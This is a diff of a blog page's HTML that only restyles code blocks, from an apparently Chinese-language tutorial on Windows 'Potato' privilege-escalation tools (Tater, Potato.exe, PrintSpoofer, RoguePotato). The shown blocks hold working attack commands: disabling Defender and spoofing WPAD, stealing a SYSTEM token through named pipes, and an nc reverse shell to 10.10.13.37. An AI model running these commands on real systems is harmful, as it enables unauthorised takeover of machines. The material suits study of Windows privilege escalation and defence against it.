@@ -265,9 +265,9 @@
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">Tater</span><span class="p">.</span><span class="n">ps1</span>
-<span class="nb">Invoke-Tater</span> <span class="n">-Command</span> <span class="s2">&#34;command to execute&#34;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">Tater</span><span class="p">.</span><span class="n">ps1</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Invoke-Tater</span> <span class="n">-Command</span> <span class="s2">&#34;command to execute&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -294,8 +294,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">Potato.exe -ip -cmd <span class="o">[</span>cmd to run<span class="o">]</span> -disable_exhaust <span class="nb">true</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Potato.exe -ip -cmd <span class="o">[</span>cmd to run<span class="o">]</span> -disable_exhaust <span class="nb">true</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>Win Server 2008 利用 - Windows Update 机制</li>
@@ -305,8 +305,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">Potato.exe -ip -cmd <span class="o">[</span>cmd to run<span class="o">]</span> -disable_exhaust <span class="nb">true</span> -disable_defender <span class="nb">true</span> -spoof_host WPAD.EMC.LOCAL
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Potato.exe -ip -cmd <span class="o">[</span>cmd to run<span class="o">]</span> -disable_exhaust <span class="nb">true</span> -disable_defender <span class="nb">true</span> -spoof_host WPAD.EMC.LOCAL
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>Win Server 2012 R2 - 自动更新机制，该机会每天下载证书信任列表(CTL)</li>
@@ -316,8 +316,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>防护：</p>
 <ul>
@@ -425,14 +425,14 @@
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="n">DWORD</span> <span class="n">RpcRemoteFindFirstPrinterChangeNotificationEx</span><span class="p">(</span> 
-    <span class="cm">/* [in] */</span> <span class="n">PRINTER_HANDLE</span> <span class="n">hPrinter</span><span class="p">,</span>
-    <span class="cm">/* [in] */</span> <span class="n">DWORD</span> <span class="n">fdwFlags</span><span class="p">,</span>
-    <span class="cm">/* [in] */</span> <span class="n">DWORD</span> <span class="n">fdwOptions</span><span class="p">,</span>
-    <span class="cm">/* [unique][string][in] */</span> <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">pszLocalMachine</span><span class="p">,</span>
-    <span class="cm">/* [in] */</span> <span class="n">DWORD</span> <span class="n">dwPrinterLocal</span><span class="p">,</span>
-    <span class="cm">/* [unique][in] */</span> <span class="n">RPC_V2_NOTIFY_OPTIONS</span> <span class="o">*</span><span class="n">pOptions</span><span class="p">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="n">DWORD</span> <span class="n">RpcRemoteFindFirstPrinterChangeNotificationEx</span><span class="p">(</span> 
+</span></span><span class="line"><span class="cl">    <span class="cm">/* [in] */</span> <span class="n">PRINTER_HANDLE</span> <span class="n">hPrinter</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/* [in] */</span> <span class="n">DWORD</span> <span class="n">fdwFlags</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/* [in] */</span> <span class="n">DWORD</span> <span class="n">fdwOptions</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/* [unique][string][in] */</span> <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">pszLocalMachine</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/* [in] */</span> <span class="n">DWORD</span> <span class="n">dwPrinterLocal</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/* [unique][in] */</span> <span class="n">RPC_V2_NOTIFY_OPTIONS</span> <span class="o">*</span><span class="n">pOptions</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><code>pszLocalMachine </code>参数需要传递 UNC 路径，传递 <code>\\127.0.0.1</code> 时，服务器会访问 <code>\\127.0.0.1\pipe\spoolss</code>，但这个管道已经被系统注册了，如果我们传递 <code>\\127.0.0.1\pipe</code> 则因为路径检查而报错</p>
 <p>但当传递 <code>\\127.0.0.1/pipe/foo</code> 时，校验路径时会认为 <code>127.0.0.1/pipe/foo</code> 是主机名，随后在连接 named pipe 时会对参数做标准化，将 <code>/</code> 转化为 <code>\</code>，于是就会连接 <code>\\127.0.0.1\pipe\foo\pipe\spoolss</code>，攻击者就可以注册这个 named pipe 从而窃取 client 的 token。这个 POC 启动新进程是使用 <code>CreateProcessAsUser</code> 而不是 <code>CreateProcessWithToken</code>。</p>
@@ -461,16 +461,16 @@
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\T</span>OOLS&gt;PrintSpoofer.exe -i -c cmd
-<span class="o">[</span>+<span class="o">]</span> Found privilege: SeImpersonatePrivilege
-<span class="o">[</span>+<span class="o">]</span> Named pipe listening...
-<span class="o">[</span>+<span class="o">]</span> CreateProcessAsUser<span class="o">()</span> OK
-Microsoft Windows <span class="o">[</span>Version 10.0.19613.1000<span class="o">]</span>
-<span class="o">(</span>c<span class="o">)</span> <span class="m">2020</span> Microsoft Corporation. All rights reserved.
-
-C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;whoami
-nt authority<span class="se">\s</span>ystem
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C:<span class="se">\T</span>OOLS&gt;PrintSpoofer.exe -i -c cmd
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Found privilege: SeImpersonatePrivilege
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Named pipe listening...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> CreateProcessAsUser<span class="o">()</span> OK
+</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.19613.1000<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> <span class="m">2020</span> Microsoft Corporation. All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;whoami
+</span></span><span class="line"><span class="cl">nt authority<span class="se">\s</span>ystem
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="422-派生一个-system-的进程">4.2.2 派生一个 SYSTEM 的进程</h4>
 <p>适用于无交互式 shell，但是可以命令执行，使用 CS 上马或者 nc 反弹高权限 shell：</p>
@@ -482,11 +482,11 @@ nt authority<span class="se">\s</span>ystem
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\T</span>OOLS&gt;PrintSpoofer.exe -c <span class="s2">&#34;C:\TOOLS\nc.exe 10.10.13.37 1337 -e cmd&#34;</span>
-<span class="o">[</span>+<span class="o">]</span> Found privilege: SeImpersonatePrivilege
-<span class="o">[</span>+<span class="o">]</span> Named pipe listening...
-<span class="o">[</span>+<span class="o">]</span> CreateProcessAsUser<span class="o">()</span> OK
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C:<span class="se">\T</span>OOLS&gt;PrintSpoofer.exe -c <span class="s2">&#34;C:\TOOLS\nc.exe 10.10.13.37 1337 -e cmd&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Found privilege: SeImpersonatePrivilege
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Named pipe listening...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> CreateProcessAsUser<span class="o">()</span> OK
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="423-桌面环境下派生-system-进程">4.2.3 桌面环境下派生 SYSTEM 进程</h4>
 <p>在本地登录或者 RDP 下，先用 <code>qwinsta</code> 查看当前 ID 号，然后利用 POC：</p>
@@ -506,11 +506,11 @@ nt authority<span class="se">\s</span>ystem
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\T</span>OOLS&gt;PrintSpoofer.exe -d <span class="m">3</span> -c <span class="s2">&#34;powershell -ep bypass&#34;</span>
-<span class="o">[</span>+<span class="o">]</span> Found privilege: SeImpersonatePrivilege
-<span class="o">[</span>+<span class="o">]</span> Named pipe listening...
-<span class="o">[</span>+<span class="o">]</span> CreateProcessAsUser<span class="o">()</span> OK
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C:<span class="se">\T</span>OOLS&gt;PrintSpoofer.exe -d <span class="m">3</span> -c <span class="s2">&#34;powershell -ep bypass&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Found privilege: SeImpersonatePrivilege
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Named pipe listening...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> CreateProcessAsUser<span class="o">()</span> OK
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="5-roguepotato">5 RoguePotato</h2>
 <h3 id="51-原理">5.1 原理</h3>
@@ -532,17 +532,17 @@ nt authority<span class="se">\s</span>ystem
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">Mandatory args:
--r remote_ip: ip of the remote machine to use as redirector
--e commandline: commandline of the program to launch
-
-
-Optional args:
--l listening_port: This will run the RogueOxidResolver locally on the specified port
--c {clsid}: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
--p pipename_placeholder: placeholder to be used in the pipe name creation (default: RoguePotato)
--z : this flag will randomize the pipename_placeholder (don&#39;t use with -p)
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Mandatory args:
+</span></span><span class="line"><span class="cl">-r remote_ip: ip of the remote machine to use as redirector
+</span></span><span class="line"><span class="cl">-e commandline: commandline of the program to launch
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Optional args:
+</span></span><span class="line"><span class="cl">-l listening_port: This will run the RogueOxidResolver locally on the specified port
+</span></span><span class="line"><span class="cl">-c {clsid}: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
+</span></span><span class="line"><span class="cl">-p pipename_placeholder: placeholder to be used in the pipe name creation (default: RoguePotato)
+</span></span><span class="line"><span class="cl">-z : this flag will randomize the pipename_placeholder (don&#39;t use with -p)
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -594,7 +594,7 @@ Optional args:
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
